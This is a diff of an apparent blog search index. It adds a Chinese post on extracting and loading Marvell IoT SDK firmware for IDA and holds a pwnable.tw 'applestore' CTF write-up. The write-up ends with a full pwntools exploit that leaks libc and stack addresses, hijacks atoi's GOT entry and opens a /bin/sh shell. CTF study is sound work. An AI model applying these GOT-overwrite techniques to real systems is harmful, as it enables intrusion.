@@ -1,6 +1,17 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[IoT firmware逆向之入门篇]]></title>
+    <url>%2F2018%2F07%2F10%2Ffirmware-reverse%2F</url>
+    <content type="text"><![CDATA[前言随着IoT(Internet of Things)设备快速增长，IoT设备的安全也逐渐引起大家的注意。如论文[1]所述，IoT的安全问题主要包括如下方面: 感知层安全。IoT的感知层主要包括wireless sensor networks, RFID, 802.11, BLE(Bluetooth low energy), zigbee and etc. 这些通信网络本身可能会存在一些安全问题。 网络层安全。IoT的网络层安全主要包括通信协议的安全，隐私泄露等问题。 应用层安全。应用层安全主要包括软件安全，认证问题，隐私数据的保护，认证和校验的问题。 它们的关系如下图所示： 图1 IoT安全概览 由于IoT设备对于能耗和及时性的要求比较高，所以其具体实现(操作系统及软件的保护机制)都和PC端和手机端有很大的区别。由于能耗的要求，大部分IoT设备都采用低能耗的处理器(比如arm Contex-M系列)，这些处理器大部分都没有MMU，所以没有虚拟地址到物理地址的转换，更无法提供ASLR等防护(arm Contex-M由于有MPU功能，能提供比较局限的内存防护机制)；由于实时性的要求，大部分采用的系统是RTOS(Real Time Operating System)或者直接是bare mental system，其每个设备的内存布局可能都是固定的。所以IoT设备的应用层的安全也是非常严峻的。 Firmware在IoT设备中，其代码和数据一般存储在ROM中(大部分都是Flash，关于Flash的种类可以访问here来了解一下)。一般将这部分代码和数据称为Firmware(可能表述不准确，欢迎指正)。Firmware没有一个固定的格式，它更像是一个binary blob，具体的格式和解析根据设备的不同而有所不同。 一般获取firmware的方式主要有三种: 从厂商官网下载或者逆向厂商的App获得 劫持(中间人攻击)firmware更新过程 硬件逆向，直接读取存放firmware的flash或者UART串口调试 由于现在有很多IoT设备都是Over-The-Air Firmware Update，所以有很多厂商并不会在官网上提供firmware的下载，所以一般比较通用的获取firmware的方法都是通过硬件逆向方法。关于硬件逆向，推荐两篇文章物联网硬件安全分析基础-固件提取和物联网硬件安全分析基础-串口调试。 逆向Firmware最近在查看关于firmware逆向有关的资料，发现有如下几个问题: 不知道哪些是代码段和数据段 不知道内存布局，即不知道firmware的基址 …… 在浏览了很多教程之后，发现了关于Marvell IoT SDK的一些小经验，特总结下来，以备日后查阅。具体的教程可参阅Inside The Bulb: Adventures in Reverse Engineering Smart Bulb Firmware和dustcloud。dustcloud做了挺多关于小米iot逆向的工作的，其中小米的yeelight和智能网管设备的firmware都是采用的Marvell IoT SDK。由于dustcloud直接提供了yeelight的firmware，所以就省去了我硬件逆向提取firmware的步骤了，我直接从dustcloud下载firmware。 Inside The Bulb: Adventures in Reverse Engineering Smart Bulb Firmware介绍了如何将Marvell IoT SDK格式的firmware提取出代码，并将其合并成elf文件的，由于里面细节有限，我在此重复了里面的步骤，并总结出了一些方法。 首先在二进制编辑器中可以看到该firmware是MRVL(Marvell)的，而该文件含有一些entries, 表示了不同”段”的偏移，大小和地址信息: 12345DWORD magic; // Always 0x2DWORD offset; // Offset into the fileDWORD size; // Size of the sectionDWORD address; // Memory address where this section will be loadedDWORD unknown; // Probably some kind of checksum? 具体的firmware二进制数据如下图所示: 图2 firmware二进制 可知其含有三个不同的entry，可使用dd工具将这三个不同的”段”提取出来: 123dd if=yeelink.light.strip1.bin bs=1 skip=200 count=12824 of=s1.bindd if=yeelink.light.strip1.bin bs=1 skip=13024 count=299984 of=s2.bindd if=yeelink.light.strip1.bin bs=1 skip=313008 count=5420 of=s3.bin 此时，得到了三个二进制文件，使用arm-none-eabi-objcopy将其合并成ELF文件: 1arm-none-eabi-objcopy -I binary -O elf32-littlearm --adjust-vma 0x100000 --binary-architecture arm --rename-section .data=.text,contents,alloc,load,readonly,code --add-section .text2=s2.bin --set-section-flags .text2=contents,alloc,load,readonly,code --change-section-address .text2=0x1f0032e0 --add-section .text3=s3.bin --set-section-flags .text3=contents,alloc,load,readonly,code --change-section-address .text3=0x20000040 s1.bin firmware_yeelink.elf 上面的命令就是将三个文件合并成一个ELF文件，并且分别将其置为不同的section，设置virtual address。 如果直接将生成的文件firmware_yeelink.elf扔到IDA pro中会出现一个问题：由于objcopy生成的elf文件是可重定位类型(relocatable file)，扔到IDA中虚拟地址是从0开始的，并不是从0x100000开始的。 我最后终于找到一个方法：再使用ld链接器将可重定位类型的文件生成可执行类型(executable file)，并给每一个section添加虚拟地址: 1arm-none-eabi-ld --section-start=.text=0x100000 --section-start=.text2=0x1f0032e0 --section-start=.text3=0x20000040 firmware_yeelink.elf -o firmware.elf 此时扔给IDA，虚拟地址正确. （未完待更） 引用 [1] Mendez, Diego M., Ioannis Papapanagiotou, and Baijian Yang. “Internet of things: Survey on security and privacy.” arXiv preprint arXiv:1707.01879 (2017).]]></content>
+      <categories>
+        <category>iot</category>
+      </categories>
+      <tags>
+        <tag>iot firmware</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[pwnable.tw之applestore]]></title>
     <url>%2F2018%2F07%2F01%2Fpwnable-tw%2F</url>
     <content type="text"><![CDATA[该题是模拟了apple的商店，来售卖apple的各种产品，其提供了6个功能: 1: 展示商店的商品 2: 添加商品到购物车 3: 从购物车里面将某一商品删除 4: 展示购物车里面的商品 5: 结算 6: 退出 其中，购物车是用双向链表实现的，其每一项的结构如下，其在32位机器下的大小为16字节。链表头是一个全局变量，存在0x804b068处。123456struct cart_entry&#123; char* product_name, int price, cart_entry* next, cart_entry* previous&#125;; 程序分析下面简单的分析添加，删除，购物车输出和结算功能。 添加商品添加商品是在add()函数中实现的，其在ida中反汇编出来的结果如下图所示： 该函数的逻辑也比较简单，其首先通过malloc在堆上分配16自己大小的空间，然后进行初始化，最后将该结构体添加到双向链表中。 结算结算功能是在checkout()函数中实现的，其在ida中反汇编出来的结果如下图所示: 由上图可知，其当满足总金额=7174时，则将一个临时变量v2(位于ebp-0x20)加入到双向链表中，而ebp-0x20处的内存如果能被我们所控制的话就可能进行攻击(泄露内存等)。而通过分析可知在cart()函数接收输入的时候我们的输入是能够覆盖到ebp-0x20处的。所以此时只需要满足购物车的总金额=7174即可。我们观察到一共有4种不同的价格(199,299,399,499),我们可以列个方程求出多种解。最直接的方法是交给z3求解器，具体求解如下: 12345678In [1]: from z3 import *In [2]: x = Int('x')In [3]: y = Int('y')In [4]: m = Int('m')In [5]: n = Int('n')In [7]: solve(x&gt;=0,y&gt;=0,m&gt;=0,n&gt;=0,199*x+299*y+399*m+499*n==7174)[y = 20, x = 6, n = 0, m = 0] 即可求出结果，使得满足购物车总金额=7174. 输出购物车输出购物车功能是在cart()函数中实现的，其在ida中反汇编出来的结果如下图所示： 在cart()函数中，有一个可以利用的地方就是在my_read()时，用户能输入0x15大小的数据，而输入的数据存进的内存即在ebp-0x22开始处，正好可以将checkout中的添加到双向链表的临时变量(ebp-0x20)给覆盖掉。如果我们将临时变量的第一个元素(存放商品名称)的地方存入atoi的got地址，则可以将libc的地址泄露出来。 删除删除功能是在delete()函数中实现的，其在ida中反汇编出来的结果如下图所示: 删除操作就是在双向链表中找到要删除的项，然后就是正规的双向链表操作。由于我们可以通过输入控制ebp-0x20处的项的数据，如果我们将next和previous元素修改成特定的值，就有可能修改got表项，此时就造成了控制流的劫持。一开始我是将next修改成got[‘atoi’]-0xc，将previous改成system的地址，最后发生segment fault. 仔细一想，此时确实将atoi的got表项改成了system的地址了，但是也需要将system.addr+8赋值为got[‘atoi’]-0xc，而system.addr+8处是代码段，改程序又开了NX保护，所以会发生segment fault. Attack通过前面的分析，我们可以利用cart()函数覆盖ebp-0x20处的内容，进而可以进行内存泄露攻击，将glibc的地址和栈中的地址泄露出来。通过delete函数，我们可以修改某一内存处的内容，如果我们修改ebp的值，使其在leave操作(mov esp, ebp; pop ebp)时，将修改后的ebp值赋给ebp寄存器，从而控制栈，进而修改got表项。 内存泄露通过前面的分析我们可以看到在cart()函数中，如果将ebp-0x20处的内容覆盖为got[‘atoi’]的地址，则在cart函数输出的时候，就可以将atoi的got表项的内容泄露出来，即glibc的atoi函数的地址。 泄露栈中的地址，一开始没有思路，通过网上的write up，学到了一个方法：glibc有一个全局变量’environ’,该变量保存用户环境，其是一个char**类型，在程序运行时，将用户环境指向栈上，所以environ存储的地址就是栈上的地址，如果我们将environ变量的内容泄露出来也就泄露出来了栈上的地址。 修改Got此前尝试直接将atoi的got表项改为system的地址会失败，通过查找write up发现有一个比较巧妙的方法: 通过修改子函数(delete函数)的saved ebp值为got[‘atoi’]+0x22的值，则返回delete函数到handle函数时，此时ebp即是got[‘atoi’]+0x22，此时通过my_read()函数将用户输入的值放入ebp-0x22处，即got[‘atoi’]，此时可以达到修改atoi的got表项的目的。而修改saved ebp值可以通过delete函数来实现。 完整攻击完整攻击代码如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384from pwn import *'''control ebp to control the stack, so can modify atoi got'''def addDevice(device_num): p.recvuntil('&gt;') p.sendline('2') p.recvuntil('Device Number&gt;') p.sendline(device_num)def checkout(): p.recvuntil('&gt;') p.sendline('5') p.recvuntil('(y/n) &gt;') p.sendline('y')def cart(payload): p.recvuntil('&gt;') p.sendline('4') p.recvuntil('(y/n) &gt;') p.sendline(payload)def delete(payload): p.recvuntil('&gt;') p.sendline('3') p.recvuntil('Item Number&gt;') p.sendline(payload)if __name__ == '__main__': #p = process('./applestore', env=&#123;'LD_PRELOAD' : './libc_32.so.6'&#125;) p = remote('chall.pwnable.tw', 10104) apple = ELF('./applestore') libc = ELF('./libc_32.so.6') #print("pid : " + str(proc.pidof(p))) #raw_input('attach me ') for i in range(20): addDevice('2') for i in range(6): addDevice('1') checkout() # leak libc address payload = 'y\x00' + p32(apple.got['atoi']) + '\x00\x00\x00\x00' * 3 #addDevice(payload) cart(payload) p.recvuntil('27: ') atoi_addr = u32(p.recvline()[0:4]) atoi_libc = libc.symbols['atoi'] libc_base = atoi_addr - atoi_libc log.info('atoi address is ' + hex(atoi_addr)) log.info('atoi address in libc is ' + hex(atoi_libc)) log.info('libc base address is ' + hex(libc_base)) libc.address = libc_base # leak the stack address environ_addr = libc.symbols['environ'] payload = 'y\x00' + p32(environ_addr) + '\x00\x00\x00\x00' * 3 cart(payload) p.recvuntil('27: ') environ_addr = u32(p.recvline()[0:4]) log.info('environ address is ' + hex(environ_addr)) ebp_address = environ_addr - 0x104 # delete, write the ebp to the atoi+0x22 payload = '27' + p32(0x08049002) + p32(0) + p32(apple.got['atoi'] + 0x22) + p32(ebp_address - 0x8) # gdb.attach(p, ''' # break *0x8048a3d # ''') delete(payload) # attack, set the atoi got to system addr, and execute the system('/bin/sh') payload = p32(libc.symbols['system']) + ';/bin/sh\x00' p.recvuntil('&gt;') p.sendline(payload) p.interactive()]]></content>
@@ -98,9 +109,9 @@
         <category>angr</category>
       </categories>
       <tags>
-        <tag>翻译</tag>
         <tag>exploit</tag>
         <tag>angr</tag>
+        <tag>翻译</tag>
       </tags>
   </entry>
   <entry>
@@ -169,8 +180,8 @@
         <category>反汇编</category>
       </categories>
       <tags>
-        <tag>反汇编</tag>
         <tag>exploit</tag>
+        <tag>反汇编</tag>
         <tag>seed</tag>
       </tags>
   </entry>
@@ -237,9 +248,9 @@
         <category>反汇编</category>
       </categories>
       <tags>
+        <tag>翻译</tag>
         <tag>Exploit</tag>
         <tag>反汇编</tag>
-        <tag>翻译</tag>
       </tags>
   </entry>
   <entry>
